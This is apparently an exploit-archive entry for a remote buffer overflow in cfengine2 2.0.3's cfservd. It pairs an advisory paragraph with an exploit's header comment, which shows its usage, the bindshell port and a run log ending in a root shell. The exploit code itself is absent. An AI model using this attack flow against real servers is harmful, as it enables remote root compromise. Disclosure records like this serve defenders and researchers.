This issue may be exploited by remote attackers who can send malicious transaction packets to cfservd. This issue is due to insufficient bounds checking of data that is read in during a transaction with a remote user. ， The vulnerability may be exploited to execute arbitrary code with the privileges of cfservd. A denial of service may also be the result of exploitation attempts as cfservd is multi-threaded and may not be configured to restart itself via a super-server such as inetd. ， /\\ ，  * jsk / cfengine2-2.0.3 from redhat ，  * advisory :  ，  * forking portbind shellcode 0port=26112 ) by netric ，  * bug discovered by nick cleaton , tested on redhat ，  * DSR-cfengine.pl :  ) i think it has some bugs.maybe it is only public ，  * version...... possbile another reasns..... ，  * the begin buf of exploit could be like \"111111\". so....DSR... ，  * by jsk from Ph4nt0m Security Team ，  * jsk @ ph4nt0m.net chat with us ( irc.0x557.org # ph4nt0m )  ，  * Greets bR-00t. eSdee.B??.lnewy. # cheese and all # ph4nt0m ，  *  [ root @ localhost tmp ]  # ./cnex -h 127.0.0.1 -p 5803 -t 0 ，  * cfengine2-2.0.3 : server remote buffer overflow exploit ，  * by jsk. ，  * Greets bR-00t and all # ph4nt0m . ，  *  [ + ] Hostname : 127.0.0.1 ，  *  [ + ] Port num : 5308 ，  *  [ + ] Retaddr address : 0x4029cc2c ，  *  [ 1 ]  # 1 Set codes. ，  *  [ 1 ]  # 1 Set socket. ，  *  [  *  ] attempting to connect : 127.0.0.1 : 5308. ，  *  [  *  ] successfully connected : 127.0.0.1 : 5308. ，  *  [ 1 ]  # 1 Send codes. ，  *  [ 1 ]  # 3 Get shell. ，  *  [  *  ] checking to see if the exploit was successful. ，  *  [  *  ] attempting to connect : 127.0.0.1 : 26112. ，  *  [  *  ] successfully connected : 127.0.0.1 : 26112. ，  * id ，  * uid=0 ( root ) gid=0 ( root ) groups=0 ( root )  , 1 ( bin )  , 2 ( daemon )  , 3 ( sys )  , 4 ( adm )  , 6 ( disk )  , 10 ( wheel )  ， \\/",
